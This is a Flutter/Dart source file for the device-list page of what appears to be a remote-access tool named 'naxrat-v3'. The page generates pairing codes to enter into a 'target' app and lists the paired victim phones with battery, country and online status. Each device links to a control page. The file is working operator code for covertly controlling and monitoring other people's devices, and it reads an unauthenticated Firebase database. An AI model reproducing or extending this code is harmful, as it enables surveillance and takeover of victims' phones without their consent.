// lib/devices_page.dart
import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

import 'control_page.dart';

const String kFontFamily = 'Ganang';
const String kFirebaseUrl = 'https://naxrat-v3-default-rtdb.firebaseio.com';

// ═══════════════════════════════════════════════════════════════
// PALET — PINK CUTE MINIMAL 🌸
// ═══════════════════════════════════════════════════════════════
class DevicesHx {
  static const bg    = Color(0xFF1A0E14);
  static const bgAlt = Color(0xFF241318);
  static const surface   = Color(0xFF2A1720);
  static const surfaceHi2 = Color(0xFF361D28);

  // PINK FAMILY
  static const pinkSoft  = Color(0xFFFFC1DA);
  static const pinkLight = Color(0xFFFF9EC4);
  static const pink      = Color(0xFFFF6FA5);
  static const pinkDeep  = Color(0xFFE84A8A);

  // Aksen
  static const jade     = Color(0xFF6EE7B7);
  static const terra    = Color(0xFFFF7A9A);
  static const amber    = Color(0xFFFFD58A);
  static const slate    = Color(0xFF93C5FD);

  static const ivory = Color(0xFFFFF5F8);
  static const ash   = Color(0xFFC9A8B6);
  static const ash2  = Color(0xFF7A5A66);

  static const line = Color(0x1AFF6FA5);
}

class DeviceModel {
  final String id;
  final String name;
  final int? battery;
  final String country;
  final bool online;
  final int lastSeen;

  DeviceModel({
    required this.id,
    required this.name,
    required this.battery,
    required this.country,
    required this.online,
    required this.lastSeen,
  });
}

class DevicesPage extends StatefulWidget {
  final String username;
  final String sessionKey;

  const DevicesPage({
    super.key,
    required this.username,
    required this.sessionKey,
  });

  @override
  State<DevicesPage> createState() => _DevicesPageState();
}

class _DevicesPageState extends State<DevicesPage> {
  List<DeviceModel> _devices = [];
  bool _isLoading = true;
  String? _pairingCode;
  bool _isGenerating = false;
  Timer? _refreshTimer;

  @override
  void initState() {
    super.initState();
    _loadDevices();
    _refreshTimer = Timer.periodic(const Duration(seconds: 3), (_) => _loadDevices());
  }

  @override
  void dispose() {
    _refreshTimer?.cancel();
    super.dispose();
  }

  Future<void> _generatePairingCode() async {
    if (_isGenerating) return;
    setState(() => _isGenerating = true);

    final rand = Random.secure();
    final code = List.generate(6, (_) => rand.nextInt(10)).join();

    try {
      final url = Uri.parse('$kFirebaseUrl/pair_codes/$code.json');
      final res = await http.put(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'admin_id': widget.username,
          'created_at': DateTime.now().millisecondsSinceEpoch,
          'used': false,
        }),
      );

      if (res.statusCode == 200 || res.statusCode == 204) {
        setState(() {
          _pairingCode = code;
          _isGenerating = false;
        });
        await Clipboard.setData(ClipboardData(text: code));
        _showSnack('Kode $code disalin!', success: true);
      } else {
        setState(() => _isGenerating = false);
        _showSnack('Gagal generate kode (HTTP ${res.statusCode})', error: true);
      }
    } catch (e) {
      setState(() => _isGenerating = false);
      _showSnack('Error: $e', error: true);
    }
  }

  Future<void> _loadDevices() async {
    try {
      final res = await http.get(Uri.parse('$kFirebaseUrl/devices.json'))
          .timeout(const Duration(seconds: 10));

      if (res.statusCode != 200) return;
      final data = jsonDecode(res.body);
      if (data == null) {
        if (mounted) setState(() { _devices = []; _isLoading = false; });
        return;
      }

      final now = DateTime.now().millisecondsSinceEpoch;
      final adminId = widget.username;
      final list = <DeviceModel>[];

      (data as Map<String, dynamic>).forEach((id, raw) {
        final d = raw as Map<String, dynamic>;
        if (d['admin_id'] != adminId && d['parent'] != adminId) return;

        int lastSeen = 0;
        final rawSeen = d['last_seen'];
        if (rawSeen is int) lastSeen = rawSeen;
        else if (rawSeen is String) lastSeen = int.tryParse(rawSeen) ?? 0;

        final online = lastSeen > 0 && (now - lastSeen) < 300000;

        int? battery;
        if (d['battery'] is int) battery = d['battery'];
        else if (d['battery'] is double) battery = (d['battery'] as double).toInt();

        list.add(DeviceModel(
          id: id,
          name: d['name']?.toString() ?? 'Unknown Device',
          battery: battery,
          country: d['country']?.toString() ?? '—',
          online: online,
          lastSeen: lastSeen,
        ));
      });

      list.sort((a, b) {
        if (a.online && !b.online) return -1;
        if (!a.online && b.online) return 1;
        return b.lastSeen.compareTo(a.lastSeen);
      });

      if (mounted) {
        setState(() {
          _devices = list;
          _isLoading = false;
        });
      }
    } catch (e) {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  void _showSnack(String msg, {bool error = false, bool success = false}) {
    if (!mounted) return;
    final color = error ? DevicesHx.terra : (success ? DevicesHx.jade : DevicesHx.pinkLight);
    final icon = error
        ? Icons.error_rounded
        : (success ? Icons.check_circle_rounded : Icons.info_rounded);
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: DevicesHx.surface,
      content: Row(
        children: [
          Icon(icon, color: color, size: 18),
          const SizedBox(width: 10),
          Expanded(child: Text(msg, style: TextStyle(color: DevicesHx.ivory, fontFamily: kFontFamily, fontSize: 12, fontWeight: FontWeight.w700))),
        ],
      ),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(12),
        side: BorderSide(color: color.withOpacity(0.4), width: 1),
      ),
      margin: const EdgeInsets.all(16),
    ));
  }

  String _timeAgo(int ts) {
    if (ts == 0) return '—';
    final diff = DateTime.now().millisecondsSinceEpoch - ts;
    if (diff < 60000) return 'Baru saja';
    final min = diff ~/ 60000;
    if (min < 60) return '${min}m lalu';
    final hr = min ~/ 60;
    if (hr < 24) return '${hr}j lalu';
    return '${hr ~/ 24}h lalu';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: DevicesHx.bg,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new_rounded, color: DevicesHx.pinkLight, size: 18),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text('My Devices ♡', style: TextStyle(color: DevicesHx.ivory, fontFamily: kFontFamily, fontSize: 16, fontWeight: FontWeight.w900, letterSpacing: 1.2)),
        centerTitle: true,
      ),
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF1A0E14), Color(0xFF241318)],
          ),
        ),
        child: SafeArea(
          child: RefreshIndicator(
            onRefresh: _loadDevices,
            color: DevicesHx.pinkLight,
            backgroundColor: DevicesHx.surface,
            child: ListView(
              physics: const AlwaysScrollableScrollPhysics(parent: BouncingScrollPhysics()),
              padding: const EdgeInsets.all(16),
              children: [
                _buildPairingCard(),
                const SizedBox(height: 24),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        const Icon(Icons.favorite_rounded, color: DevicesHx.pink, size: 12),
                        const SizedBox(width: 8),
                        const Text('DEVICE LIST', style: TextStyle(color: DevicesHx.ivory, fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 2)),
                      ],
                    ),
                    Text('${_devices.length} Terhubung', style: const TextStyle(color: DevicesHx.ash, fontSize: 11)),
                  ],
                ),
                const SizedBox(height: 12),
                if (_isLoading)
                  const Center(child: Padding(padding: EdgeInsets.all(20), child: CircularProgressIndicator(color: DevicesHx.pinkLight))),
                if (!_isLoading && _devices.isEmpty)
                  _buildEmptyState(),
                if (!_isLoading) ..._devices.map((d) => _buildDeviceCard(d)),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildPairingCard() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: DevicesHx.surface,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(
          color: _pairingCode != null
              ? DevicesHx.jade.withOpacity(0.5)
              : DevicesHx.pink.withOpacity(0.3),
          width: 1.2,
        ),
        boxShadow: [
          BoxShadow(
            color: (_pairingCode != null ? DevicesHx.jade : DevicesHx.pink).withOpacity(0.2),
            blurRadius: 18,
            spreadRadius: 1,
            offset: const Offset(0, 6),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: DevicesHx.pink.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: DevicesHx.pink.withOpacity(0.4), width: 1),
                  boxShadow: [
                    BoxShadow(
                      color: DevicesHx.pink.withOpacity(0.3),
                      blurRadius: 8,
                      spreadRadius: 1,
                    ),
                  ],
                ),
                child: const Icon(Icons.qr_code_rounded, color: DevicesHx.pinkLight, size: 20),
              ),
              const SizedBox(width: 14),
              const Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('PAIRING CODE ♡', style: TextStyle(color: DevicesHx.ivory, fontSize: 13, fontWeight: FontWeight.w900, letterSpacing: 1.2)),
                    SizedBox(height: 4),
                    Text('Masukkan kode ini ke aplikasi target', style: TextStyle(color: DevicesHx.ash, fontSize: 11)),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 20),
          if (_pairingCode != null) ...[
            Container(
              padding: const EdgeInsets.symmetric(vertical: 16),
              decoration: BoxDecoration(
                color: DevicesHx.surfaceHi2,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: DevicesHx.jade.withOpacity(0.5), width: 1.2),
                boxShadow: [
                  BoxShadow(
                    color: DevicesHx.jade.withOpacity(0.2),
                    blurRadius: 12,
                    spreadRadius: 1,
                  ),
                ],
              ),
              child: Center(
                child: Text(
                  _pairingCode!,
                  style: const TextStyle(
                    color: DevicesHx.ivory,
                    fontFamily: 'monospace',
                    fontSize: 36,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 12,
                  ),
                ),
              ),
            ),
            const SizedBox(height: 12),
            Row(
              children: [
                Expanded(
                  child: TextButton.icon(
                    onPressed: () {
                      Clipboard.setData(ClipboardData(text: _pairingCode!));
                      _showSnack('Kode disalin!', success: true);
                    },
                    icon: const Icon(Icons.copy_rounded, color: DevicesHx.pinkLight, size: 16),
                    label: const Text('SALIN', style: TextStyle(color: DevicesHx.pinkLight, fontWeight: FontWeight.w900)),
                  ),
                ),
                Expanded(
                  child: TextButton.icon(
                    onPressed: () => setState(() => _pairingCode = null),
                    icon: const Icon(Icons.close_rounded, color: DevicesHx.terra, size: 16),
                    label: const Text('TUTUP', style: TextStyle(color: DevicesHx.terra, fontWeight: FontWeight.w900)),
                  ),
                ),
              ],
            )
          ] else
            Container(
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(12),
                gradient: const LinearGradient(
                  colors: [DevicesHx.pinkLight, DevicesHx.pinkDeep],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                boxShadow: [
                  BoxShadow(
                    color: DevicesHx.pink.withOpacity(0.5),
                    blurRadius: 16,
                    spreadRadius: 2,
                    offset: const Offset(0, 6),
                  ),
                ],
              ),
              child: FilledButton(
                onPressed: _isGenerating ? null : _generatePairingCode,
                style: FilledButton.styleFrom(
                  backgroundColor: Colors.transparent,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 16),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                  shadowColor: Colors.transparent,
                ),
                child: _isGenerating
                    ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                    : const Text('GENERATE CODE ♡', style: TextStyle(fontWeight: FontWeight.w900, letterSpacing: 1.4, fontSize: 12)),
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildEmptyState() {
    return Container(
      padding: const EdgeInsets.all(30),
      decoration: BoxDecoration(
        color: DevicesHx.surface,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: DevicesHx.pink.withOpacity(0.3), width: 1),
        boxShadow: [
          BoxShadow(
            color: DevicesHx.pink.withOpacity(0.1),
            blurRadius: 12,
            spreadRadius: 1,
          ),
        ],
      ),
      child: const Column(
        children: [
          Icon(Icons.phone_iphone_rounded, color: DevicesHx.pinkLight, size: 40),
          SizedBox(height: 12),
          Text('Belum ada device', style: TextStyle(color: DevicesHx.ivory, fontSize: 14, fontWeight: FontWeight.w900)),
          SizedBox(height: 6),
          Text('Generate pairing code di atas, lalu masukkan ke target.', textAlign: TextAlign.center, style: TextStyle(color: DevicesHx.ash, fontSize: 11)),
        ],
      ),
    );
  }

  Widget _buildDeviceCard(DeviceModel d) {
    final batt = d.battery ?? 0;
    final battColor = batt > 50 ? DevicesHx.jade : (batt > 20 ? DevicesHx.amber : DevicesHx.terra);

    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: () {
          HapticFeedback.mediumImpact();
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => ControlPage(
                deviceId: d.id,
                deviceName: d.name,
                username: widget.username,
                sessionKey: widget.sessionKey,
              ),
            ),
          );
        },
        borderRadius: BorderRadius.circular(18),
        child: Container(
          margin: const EdgeInsets.only(bottom: 12),
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: DevicesHx.surface,
            borderRadius: BorderRadius.circular(18),
            border: Border.all(
              color: d.online
                  ? DevicesHx.jade.withOpacity(0.5)
                  : DevicesHx.pink.withOpacity(0.25),
              width: d.online ? 1.3 : 1,
            ),
            boxShadow: [
              BoxShadow(
                color: (d.online ? DevicesHx.jade : DevicesHx.pink).withOpacity(0.15),
                blurRadius: 14,
                spreadRadius: 1,
                offset: const Offset(0, 4),
              ),
            ],
          ),
          child: Column(
            children: [
              Row(
                children: [
                  Container(
                    width: 48, height: 48,
                    decoration: BoxDecoration(
                      color: d.online
                          ? DevicesHx.jade.withOpacity(0.15)
                          : DevicesHx.pink.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(
                        color: d.online
                            ? DevicesHx.jade.withOpacity(0.5)
                            : DevicesHx.pink.withOpacity(0.3),
                        width: 1,
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: (d.online ? DevicesHx.jade : DevicesHx.pink).withOpacity(0.25),
                          blurRadius: 10,
                          spreadRadius: 1,
                        ),
                      ],
                    ),
                    child: Icon(
                      Icons.phone_iphone_rounded,
                      color: d.online ? DevicesHx.jade : DevicesHx.pinkLight,
                      size: 24,
                    ),
                  ),
                  const SizedBox(width: 14),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          d.name,
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                          style: TextStyle(
                            color: d.online ? DevicesHx.ivory : DevicesHx.ash,
                            fontSize: 14,
                            fontWeight: FontWeight.w900,
                          ),
                        ),
                        const SizedBox(height: 6),
                        Row(
                          children: [
                            Container(
                              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                              decoration: BoxDecoration(
                                color: d.online
                                    ? DevicesHx.jade.withOpacity(0.15)
                                    : DevicesHx.ash2.withOpacity(0.2),
                                borderRadius: BorderRadius.circular(4),
                                border: Border.all(
                                  color: d.online
                                      ? DevicesHx.jade.withOpacity(0.5)
                                      : DevicesHx.pink.withOpacity(0.2),
                                ),
                              ),
                              child: Text(
                                d.online ? 'ONLINE' : 'OFFLINE',
                                style: TextStyle(
                                  color: d.online ? DevicesHx.jade : DevicesHx.ash,
                                  fontSize: 8,
                                  fontWeight: FontWeight.w900,
                                  letterSpacing: 0.5,
                                ),
                              ),
                            ),
                            const SizedBox(width: 8),
                            Text(d.country, style: const TextStyle(color: DevicesHx.ash, fontSize: 10)),
                          ],
                        )
                      ],
                    ),
                  ),
                  const Icon(Icons.chevron_right_rounded, color: DevicesHx.pinkLight, size: 24),
                ],
              ),
              const SizedBox(height: 14),
              Row(
                children: [
                  const Icon(Icons.access_time_rounded, size: 12, color: DevicesHx.ash2),
                  const SizedBox(width: 4),
                  Text(_timeAgo(d.lastSeen), style: const TextStyle(color: DevicesHx.ash2, fontSize: 10, fontWeight: FontWeight.w600)),
                  const Spacer(),
                  if (d.battery != null) ...[
                    Icon(Icons.battery_std_rounded, size: 14, color: battColor),
                    const SizedBox(width: 4),
                    Text('$batt%', style: TextStyle(color: battColor, fontSize: 11, fontWeight: FontWeight.w900)),
                  ] else
                    const Text('Baterai ?', style: TextStyle(color: DevicesHx.ash2, fontSize: 10)),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}